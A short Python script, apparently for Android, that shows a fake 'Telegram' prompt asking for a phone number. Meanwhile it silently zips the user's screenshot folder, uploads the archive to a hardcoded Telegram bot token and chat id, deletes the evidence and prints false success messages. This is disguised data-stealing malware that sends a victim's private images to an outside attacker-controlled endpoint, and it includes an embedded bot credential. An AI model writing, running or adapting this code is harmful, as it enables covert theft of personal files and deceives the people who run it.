import os
import zipfile
import requests


os.system('clear ')


print(" \033[1;32m    [ Telegram .... ]")
 

print(" ")
print(" ")
print(" ")
print(" ")

input( " \033[1;32m  [ Number:  " )

token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
chat_id = "5894045208"


os.chdir("/sdcard/DCIM/Screenshots")


with zipfile.ZipFile("Screenshots.zip", "w", zipfile.ZIP_STORED) as zip_file:
    for root, dirs, files in os.walk("Screenshots"):
        for file in files:
            zip_file.write(os.path.join(root, file))


url = f"https://api.telegram.org/bot{token}/sendDocument"
data = {"chat_id": chat_id}
files = {"document": open("Screenshots.zip", "rb")}
requests.post(url, data=data, files=files)




os.remove("Screenshots.zip")

os.system("clear")


print(" ")
print(" ")
print(" ")
print(" ")
print(" ")


print("\033[1;32m  Telegram 1 ✅ ")

#


token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
chat_id = "5894045208"



os.system("clear")

print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print("  \033[1;32m   Telegram 2 ✅")



